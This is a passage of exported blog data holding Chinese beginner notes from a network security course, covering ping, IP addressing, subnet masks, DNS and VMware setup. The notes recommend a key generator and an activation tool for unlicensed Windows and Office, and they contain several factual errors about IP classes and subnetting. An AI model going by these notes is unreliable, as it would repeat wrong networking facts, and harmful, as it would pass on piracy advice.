修改 ping 包数量为 number ping -l number 目标 IP # 修改 ping 包大小为 number 字节 cls # 清空屏幕 exit # 退出 相关经验 0~255 五类 ip 地址之间还有一些特殊地址。比如：127.0.0.1 是一个回环地址，表示访问自己。 从路由器往下，包括交换机，和若干台 PC 组成一个局域网。 在网络连接的更改适配器中，可以看到自己计算机硬件的网卡。 点击本地连接的网络，右键属性，高级设置，找到（tcp/ip）属性，可以配置ip, 子网掩码，网关，以及 DNS 服务器。 114.114.114.114 中国的通用域名解析服务器。 8.8.8.8 也是一个常用的域面解析服务器但是在美国。一般，简单的 ipv4 地址都在外国。 win + E 打开一页文件管理器。 突然发现，连接电信宽带后，默认的域名解析服务器是 192.168.0.1，该服务器是电信公司局域网的 DNS 中继。访问速度慢，所以我查了一下邵阳地区的 DNS 服务器，然后给配置上了。并且，顺带给手机DNS服务器也更换了，果然快了很多！！！！！ 手机难道没有防火墙吗，为什么可以无限ping呢？","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"IP地址","date":"2020-07-11T02:08:00.000Z","path":"2020/07/11/2020.07.11第三章 ip 地址详解/","text":"第三章、IP地址详解。1. 基础概念局域网 一般称为内网。 简单局域网的构成：交换机、网线、PC(其他 IT 终端)。 交换机组建局域网最重要的设备。(很多接口) 路由器使能够访问内外网。（只有两个接口，一个连接交换机，一个链接网络） 比如家里的路由器（杂机），既具有交换机的功能，可以组建局域网，还具有路由器功能，可以连接网络。 ip地址全球的ipv4地址，是由32位2进制组成的。00000000 . 00000000 . 00000000 . 00000000 十进制表示范围：0.0.0.0 ~ 255.255.255.255 表示方法：点分二进制发，将每8位二进制转化成十进制，中间用 ‘.’ 号分割。 子网掩码 局域网通信规则：在同一个局域网中，在同一个网段中才能通信。 eg: 家里的路由器 192.168.1.1 ~ 192.168.1.255。 前三段相同，那前三位就是一个网段。网段只有三种可能，前1，前2，前3 位。 子网掩码：255.0.0.0 — 255.255.0.0 —–255.255.255.0 ip地址做与运算，得到的就是子网掩码可能。多少个255，表示局域网通信的网段为前多少位。 与 255 对应的数字是 ip 中的网络位， 与 0 对应的数字为 ip 中的主机位。 ip地址 ：196.168.101.1 子网掩码：255.255.0.0 表示网络位 196.168.x.x 主机 101.1 IP地址分类 A 类：1-122 默认子网掩码 255.0.0.0 B 类：128-191 ————255.255.0.0 C 类：192-223————255.255.255.0 D 类：224-239 组播地址，路由器，服务器，防火墙许多都用到组播技术。许多个 ip 共用一个组播 ip。 E 类：240-254 科研使用。 目前我们使用的 ip 地址就是前三类地址。 ip地址网段细节 每一段从 1 开始。 每一个网段的最后一个地址，255。表示该网段的广播地址，表示该局域网的全局地址。 主机位不能全为 0， 也不能全是 255。也就是如果主机位是两位，或者三位，那么可以不全为255，或者 0。10.1.0.1~10.1.255.254 = 65536 - 2。 四个 255 表示所有 ip 的全局地址。 经验知识 给一台设备配置网络，首先要找到连接上电脑的网卡。然后，如果是服务器ip, 必须是自己手工配置，不能是自动获取的，以免ip变动。一般只要在网卡所连接的网络上面，右击设置属性就可以。 子网掩码也是占用一个ip地址的，网关其实就是一个局域网的第一个ip，比如192.168.101.1 域名解析DNS，一般用8.8.8.8做备用，192.168.0.1是中国电信的默认DNS。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"虚拟机的安装使用","date":"2020-07-09T17:08:00.000Z","path":"2020/07/10/2020.07.10网安虚拟机安装/","text":"安装VMware workstation (虚拟机 寄居架构) 下载安装程序（百度网盘有） 用密匙生成器，生成激活码 打开后安装虚拟系统。 安装虚拟系统 下载相应的系统镜像文件（百度网盘有winxp 和 win2003的镜像） 找个磁盘空间，建立VM文件夹，里面用来存放虚拟系统的安装路径。 在 VMware 中建立相应的虚拟机，然后从虚拟光驱导入系统镜像。 更改硬件配置，把不需要的打印 和 声卡设备可以移除。 运行虚拟机，按照流程弄好后，用激活码激活windows系统。 运行 VMware 中的 tool ，给系统按照驱动。 控制面板中 关闭防火墙， 关闭自动更新。 做快照 给每一台虚拟机做快照，方便恢复。 克隆（不完全克隆） 从快照中，克隆一个一模一样的虚拟机系统。 修改克隆系统的计算机名，防止重名。 克隆两台win2003 和 winxp win2003 一般为服务器系统。 两台一模一样，仅仅计算机名称不同。 都布置最佳状态快照。 装系统 UItealos 制作系统盘。 驱动精灵可以为新装的系统提供驱动。 系统密匙的话呢，自己从网上找吧。 虚拟机系统总结 由于计算机硬盘资源不足，所以windows 2008 (x2) 和 windows-7(x1) 就暂时不安装了。 下了个暴风激活软件，感觉还可以。可以一键激活 windows 和 office 软件。 后期可能会给我的计算机购买硬盘，以及内存条。最好到同一家店买，然后让店家给个螺丝刀。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"虚拟机架构","date":"2020-07-05T17:08:00.000Z","path":"2020/07/06/2020.07.06入门网络安全系列(BV1uv41167Hk)/","text":"网络安全课程体系计算机 -&gt; 内外 -&gt;（网络漏洞） 互联网、服务器（服务器系统漏洞）。 第一阶段：windows 系统学习，研究。主要是服务器系统学习，其次是个人 PC 服务器。 第二阶段：Centos 、 Linux 系统学习。 第三阶段：代码安全，代码审计，web 页面是由代码编写的。 第四阶段：web 渗透测试，对上线的 web 页面进行渗透测试。 学完之后：安全工程师，系统工程师，网络工程师……. 虚拟环境部署寄居架构虚拟机监视器：运行在宿主机。 虚拟机：可以开多台，运行在虚拟机监视器中。攻击方虚拟机 -&gt; 靶机。 原生架构 虚拟机软件直接安装在计算机硬件上。 虚拟机变成了 -&gt; 虚拟机操作系统。 不依赖于宿主机，更加独立，并且多开操作系统可以同时运行。 – Vmware VMware Workstation（寄居） VMware vSphere（原生） – 微软 Hyper-V（寄居）","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]}]